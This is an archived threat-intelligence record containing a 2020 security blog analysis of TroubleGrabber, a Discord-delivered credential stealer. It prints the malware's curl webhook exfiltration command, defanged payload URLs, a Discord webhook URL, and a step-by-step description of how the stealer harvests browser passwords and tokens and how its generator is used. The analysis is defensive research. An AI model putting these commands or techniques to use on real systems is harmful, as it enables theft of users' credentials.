{
    "id": "49a3f088-6a5c-4343-891f-47abbf5c79b9",
    "created_at": "2023-01-12T14:59:24.232258Z",
    "updated_at": "2025-03-27T02:11:24.432199Z",
    "deleted_at": null,
    "sha1_hash": "be4deda6d87bd30919cd24c27f17bf4d93b718b0",
    "title": "2020-11-13 - Here Comes TroubleGrabber- Stealing Credentials Through Discord",
    "authors": "",
    "file_creation_date": "2022-05-29T01:08:47Z",
    "file_modification_date": "2022-05-29T01:08:47Z",
    "file_size": 1610571,
    "plain_text": "# Here Comes TroubleGrabber: Stealing Credentials Through Discord\n\n**[netskope.com/blog/here-comes-troublegrabber-stealing-credentials-through-discord](https://www.netskope.com/blog/here-comes-troublegrabber-stealing-credentials-through-discord)**\n\nAshwin Vamshi November 13, 2020\n\n“TroubleGrabber” is a new credential stealer that is being spread through Discord attachments and uses Discord messages to\n[communicate stolen credentials back to the attacker. While it bears some functional similarity to AnarchyGrabber, it is](https://www.bleepingcomputer.com/news/security/discord-client-turned-into-a-password-stealer-by-updated-malware/)\nimplemented differently and does not appear to be linked to the same group. TroubleGrabber is written by an individual named\n“Itroublve” and is currently used by multiple threat actors to target victims on Discord.\n\nThis malware, which primarily arrives via drive-by download, steals the web browser tokens, Discord webhook tokens, web\nbrowser passwords, and system information. This information is sent via webhook as a chat message to the attacker’s Discord\nserver. Based on the file names and delivery mechanisms, TroubleGrabber is actively being used to target gamers.\n\nWe discovered TroubleGrabber in October 2020 when researching public Discord attachments for our previous blog post, Leaky\nChats: Accidental Exposure and Malware in Discord Attachments.\n\nThis post will detail the technical analysis of TroubleGrabber and provide insights on the generator and its creator.\n\n## Discovery\n\nIn October 2020 alone, we identified more than 5,700 public Discord attachment URLs hosting malicious content, mostly in the\nform of Windows executable files and archives. At the same time, we scanned our malware database for samples containing\nDiscord URLs used as next stage payloads or C2’s.\n\nFigure 1 shows a breakdown of the top five detections of 1,650 malware samples from the same time period that were delivered\nfrom Discord and also contained Discord URLs.\n\n\n-----\n\nFigure 1: Top five detections\n\nThese detections are related to two distinct groups of malware\n\n1. GameHack – Gen:Variant.Mikey.115607, Trojan.GenericKD.43979330 were patched or cracked versions of popular games.\n\nAll the files associated with these detections were delivered via Discord.\n2. TroubleGrabber – Gen:Variant.Razy.742965 and Gen:Variant.Razy.728469 were the first stage payload of\n\nGen:Variant.Razy.729793, a new malware variant we had not seen before October 2020. The files associated with these\ndetections used Discord for malware delivery, next stage payloads, and C2 communication.\n\n## Attack depiction\n\nThe visual depiction of the TroubleGrabber attack kill chain is shown in Figure 2.\n\nFigure 2: TroubleGrabber attack kill chain\n\n\n-----\n\nThe depiction in Figure 2 illustrates the following steps\n\nThe delivery of TroubleGrabber to the victim’s machine via Discord attachment link.\nTruoubleGrabber using Discord and Github for downloading the next stage payloads to the victim’s machine.\nThe payloads steal victims credentials like system information, IP address, web browser passwords, and tokens. It then\nsends them as a chat message back to the attacker via a webhook URL.\n\n## TroubleGrabber analysis\n\nThe sample we are using for this analysis was hosted in the Discord URL –\nhttps://cdn[.]discordapp[.]com/attachments/770854312020410388/770854941614014504/Discord_Nitro_Generator_and_Checker.rar\n(md5 – 172c6141eaa2a9b09827d149cb3b05ca). The downloaded archive “Discord_Nitro_Generator_and_Checker.rar”\nmasqueraded as a Discord Nitro Generator application. The archive contained an executable file named “Discord Nitro Generator\nand Checker.exe”. An excerpt from the decompiled code is shown in Figure 3.\n\nFigure 3: Decompiled code of Discord Nitro Generator and Checker.exe\nFigure 3 illustrates that the executable downloads the next stage payloads to “C:/temp” from the seven URLs hosted in Discord\nand Github as listed below\n\n\n-----\n\n```\n  p [ ] pp[ ] [ ]\nhttps://raw[.]githubusercontent[.]com/Itroublve/Token-Browser-Password-StealerCreator/master/AVOID%20ME/tokenstealer[.]vbs\nhttps://raw[.]githubusercontent[.]com/Itroublve/Token-Browser-Password-StealerCreator/master/AVOID%20ME/tokenstealer2[.]vbs\nhttps://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/WebBrowserPassView[.]exe?\nraw=true\nhttps://raw[.]githubusercontent[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/curl-cabundle[.]crt\nhttps://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/curl[.]exe?raw=true\nhttps://cdn[.]discordapp[.]com/attachments/773838254905622541/773838305497186304/sendhookfile[.]exe\n\n```\nThe functionality of curl.exe, Curl-ca-bundle.crt, WebBrowserPassView.exe, tokenstealer.vbs,\nTokenstealer2.vbs,Tokenstealer.bat, and sendhookfile.exe is as follows:\n\n### Curl.exe\n\nCurl.exe is a command-line tool that is used for uploading, downloading, and posting data over multiple supported protocols. The\nmalware uses a curl command for posting status message of the victim’s details via webhook as follows:\n```\nC:/temp/curl -X POST -H \"Content-type: application/json\" --data \"{\\\"content\\\": \\\"**INJECTION STARTED!**\\\"}\" Webhook \n\n### Curl-ca-bundle.crt\n\n```\nCurl-ca-bundle.crt is the certificate used by curl to validate with the remote server. Curl performs SSL certificate verification by\nusing the public certificate authorities present in the file curl-ca-bundle.crt for uploading, downloading, and posting data.\n\n### WebBrowserPassView.exe\n\nWebBrowserPassView.exe is a password recovery utility from Nirsoft that reveals the passwords saved in web browsers. This\nutility has a history of being used by threat actors to steal the stored passwords and send them back to their C2. TroubleGrabber\nuses WebBrowserPassView.exe to do the same.\n\n### Tokenstealer.vbs\n\nTokenstealer.vbs is a Visual Basic script that extracts information from the infected host, including the product name, product ID,\nand product key, and saves it in the location “C:\\temp\\WindowsInfo.txt”.\n\n### Tokenstealer2.vbs\n\nTokenstealer2.vbs is a Visual Basic script that executes the file present in the location “C:\\temp\\finalres.bat”. Finalres.bat is the\nrenamed file of tokenstealer.bat.\n\n### Tokenstealer.bat\n\nTokenstealer.bat is a batch file that performs the following actions\n\nUses https://myexternalip.com/raw to query the external IP address of the victim and saves it to the location\n“C:\\temp\\ip_address.txt”\nUses WebBrowserPassView.exe with the switch ‘stext’ to reveal the passwords saved in all of the victim’s web browsers\nand saves them to the location “C:/temp/Passwords.txt”\nUses Windows system info with the switch ‘findstr’ and wmic commands to find the “Domain,” “OS Name,” “OS Version,”\n“System Manufacturer,” “System Model,” “System type,” “Total Physical Memory,” “Disk drive,” “Hard Drive Space,” “Serial\nnumber,” and “cpuname”’ and saves it to the location “C:\\temp\\System_INFO.txt”\nPerforms curl posts of username, time and date, IP address, SystemInfo, and Discord, PTB, and Canary tokens via\nwebhooks to the attacker’s Discord server\nExecutes filed.exe and customeExe.exe using the switch –processStart from the location “C:\\temp\\”\nKills Discord.exe, DiscordCanary.exe, and DiscordPTB.exe forcefully by using taskkill with the switch “/f /im” and restarts\nthem\nDeletes the files ip_address.txt, WindowsInfo.txt, Passwords.txt, curl-ca-bundle.crt, curl.exe, and CustomEXE.exe using del\ncommand with the switch “/f /q”\nShuts down and restarts the machine in 30 seconds using the shutdown command\n\n### Sendhookfile.exe\n\n\n-----\n\nSendhookfile.exe is an executable file that steals the tokens from web browsers and native Discord apps and posts them to the\nDiscord webhook URL, “https://discord[.]com/api/webhooks/770853687592878092/Tt_nUInROAYwvSoRbXXJfArRFgMMFTweKLmgJDnS-YyAahH7gKiRCmwE_aG1gIbL0mX” as shown in Figure 4.\n\nFigure 4: Decompiled code of sendhookfile.exe\n\n## Execution issues\n\nDuring our analysis, the executable crashed in our sandbox environment as shown in Figure 5.\n\nFigure 5: Discord Nitro Generator and Checker.exe\n\ncrash\nThis same crash message was seen for several other binaries that we executed in our analysis test environments. The\n[executables crashed because the binaries were compiled without the support of TLS 1.2, which is not supported by default in the](https://blogs.perficient.com/2016/04/28/tsl-1-2-and-net-support/)\n.NET 4.5 framework installed in our analysis machines. This is supported by default in .NET 4.6 and above.\n\nOn execution, the malware downloaded the binaries to the location “C:\\temp” as shown in Figure 6.\n\n\n-----\n\nFigure 6: Next stage payloads downloaded to the location “C:\\temp”\n\nThe malware further sent all the victim’s credentials via webhooks as chat messages as shown in Figure 7.\n\nFigure 7:\n\nCredentials sent as chat messages via webhooks\n\n## Github account – Itroublve\n\n“Discord Nitro Generator and Checker.exe” downloaded five next stage payloads from the Github user Itroublve in the repository\n“https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator” as shown in Figure 8.\n\n\n-----\n\nFigure 8: Github repository of Token-Browser-Password-Stealer-Creator\nWe downloaded the latest release “ItroublveTSC V5.1” from the location “https://github.com/Itroublve/Token-Browser-PasswordStealer-Creator/releases/tag/5.1”. The package contained the generator of the malware and its components.\n\n### ItroublveTSC_V5.1\n\nThe package contained an executable named “ItroublveTSC.exe” that is used to generate the malware and its components as\nshown in Figure 9.\n\n\n-----\n\nFigure 9: ItroublveTSC V5.1\nThe working of the generator is as follows\n\nThe user provides their webhooks token in the “Webhook Here” section and clicks the “Create Stealer Files” checkbox. This\ngenerates two files, namely “sendhookfile.exe” and “Token Stealer.bat” in the location “ItroublveTSC_V5.1\\output”.\nThe user uploads “sendhookfile.exe” and “Token Stealer.bat” to any file sharing app and pastes the links in the generator.\nThe user can also enter a fake message box, add a custom icon, enter the file details and also select additional options\nincluding “Crash PC”, “Auto Remove EXE,” “Restart Discord,” “Restart PC,” “ShutdownPC,” and “Custom EXE”.\nThe user clicks “Create Stealer” to generate a file named “Token Stealer.exe” in the “ItroublveTSC_V5.1” folder.\n\nAt the time of this writing, the information tab in the generator pointed to the webpage https://itroublvehacker[.]ml/howtousev5,\nwhich was not responsive.\n\nWe added the TLS 1.2 support to the source code we compiled as a working binary, as shown in the second line of the main ()\nfunction in Figure 10, to avoid the execution issues mentioned above.\n\nFigure 10: Source code of ItroublveTSC_V5.1\n\n## Itroublve – OSINT\n\n\n-----\n\nThe original author of this malware, Ithoublve pasted their moniker throughout both the generator and malware. Through open\nsource intelligence (OSINT) analysis, we identified the Discord server, Facebook page, Twitter, Instagram, website, email\naddress, and YouTube channel of “Itroublve”. In one of the Facebook posts, Itroublve mentions that the YouTube channel was\nterminated, thereby creating a new channel. At the time of this writing, the Discord server of Itroublve had 573 members as\nshown in Figure 11.\n\nFigure 11: Discord server of Itroublve\n\nThe YouTube page contained a demonstration of the usage of the ItroublveTSC generator where Itroublve demonstrated how to\nupload the files “Token Stealer.bat” and “Sendhookfile.exe” to Discord, and generate public links to enter in the check box as\nshown in Figure 12.\n\nFigure 12: Generate public link for “Token Stealer.bat” and “Sendhookfile.exe”\nOur analysis shows that multiple hackers have followed this exact tutorial, evident from the number of different Discord servers\nused to host the generated malware.\n\n## Observations\n\n\n-----\n\nTroubleGrabber is the latest example of malware that abuses cloud apps across every stage of the kill chain. Specifically,\nTroubleGrabber uses four common techniques:\n\n**Using cloud apps for initial delivery. Attackers select cloud apps that are likely to be widely used by their targets.**\n**Using cloud apps for next stage payload delivery. Attackers are increasingly using cloud apps to download second**\npayloads, again using apps that are popular among their targets and therefore likely to be allowed.\n**Using cloud apps for command and control. Like initial delivery and next stage payload delivery, using apps that are**\npopular among their targets helps attackers evade detection.\n**Stealing cloud app credentials. This could mean usernames and passwords or tokens. Stolen credentials can be used for**\na variety of reasons, including spying on the victim or launching additional attacks from the victims account.\n\n[TroubleGrabber shares similarities to different password and token stealer families like AnarchyGrabber, a malware that steals](https://www.bleepingcomputer.com/news/security/discord-client-turned-into-a-password-stealer-by-updated-malware/)\npasswords and user tokens, disables 2FA, and spreads malware to the victim’s Discord server. However, it is a completely new\nimplementation and does not appear to be linked to the same group.\n\nWe identified more than 1,000 generated binaries that were distributed via drive-by download URLs with file names posing as\ngame cheats, Discord installers, and software cracks. Figure 13 shows that it was distributed primarily via Discord, with small\nnumbers distributed via anonfiles.com and anonymousfiles.io, services that allow users to upload files anonymously and free for\ngenerating a public download link.\n\nFigure 13: TroubleGrabber drive-by download URLs\nAlongside this, we also identified the malware being distributed from more than 700 different Discord server channel ID’s.\n\n## Conclusions\n\nTroubleGrabber, a new credential stealer, serves as yet another example of a trend of attackers using cloud apps to abuse the\ntrust users place in those apps and evade detection. The malware uses Discord and Github to deliver the next stage payloads\nand uses Discord webhooks as a C2 to send the victims credentials. Such attacks require security solutions with application-layer\ndetections, multiple threat detection solutions, DLP, and machine learning techniques that understand the language and nature of\nthe cloud and web. Customers using Netskope Threat protection are protected from this threat.\n\nNetskope Threat Labs have reported the attack elements of TroubleGrabber to Discord, GitHub, YouTube, Facebook, Twitter, and\nInstagram on November 10, 2020.\n\nThe Indicators Of Compromise (IOC’s) associated with TroubleGrabber is available on Github –\n[https://github.com/netskopeoss/NetskopeThreatLabsIOCs/tree/main/TroubleGrabber.](https://github.com/netskopeoss/NetskopeThreatLabsIOCs/tree/main/TroubleGrabber)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-13 - Here Comes TroubleGrabber- Stealing Credentials Through Discord.pdf"
    ],
    "report_names": [
        "2020-11-13 - Here Comes TroubleGrabber- Stealing Credentials Through Discord.pdf"
    ],
    "threat_actors": [
        {
            "id": "9041c438-4bc0-4863-b89c-a32bba33903c",
            "created_at": "2023-01-06T13:46:38.232751Z",
            "updated_at": "2025-03-27T02:00:02.778714Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove"
            ],
            "source_name": "MISPGALAXY:Nitro",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a2b44a04-a080-4465-973d-976ce53777de",
            "created_at": "2022-10-25T16:07:23.911791Z",
            "updated_at": "2025-03-27T02:02:10.025108Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove",
                "Nitro"
            ],
            "source_name": "ETDA:Nitro",
            "tools": [
                "AngryRebel",
                "Backdoor.Apocalipto",
                "Chymine",
                "Darkmoon",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "Moudour",
                "Mydoor",
                "PCClient",
                "PCRat",
                "Poison Ivy",
                "SPIVY",
                "Spindest",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535564,
    "ts_updated_at": 1743041484,
    "ts_creation_date": 1653786527,
    "ts_modification_date": 1653786527,
    "files": {
        "pdf": "https://archive.orkl.eu/be4deda6d87bd30919cd24c27f17bf4d93b718b0.pdf",
        "text": "https://archive.orkl.eu/be4deda6d87bd30919cd24c27f17bf4d93b718b0.txt",
        "img": "https://archive.orkl.eu/be4deda6d87bd30919cd24c27f17bf4d93b718b0.jpg"
    }
}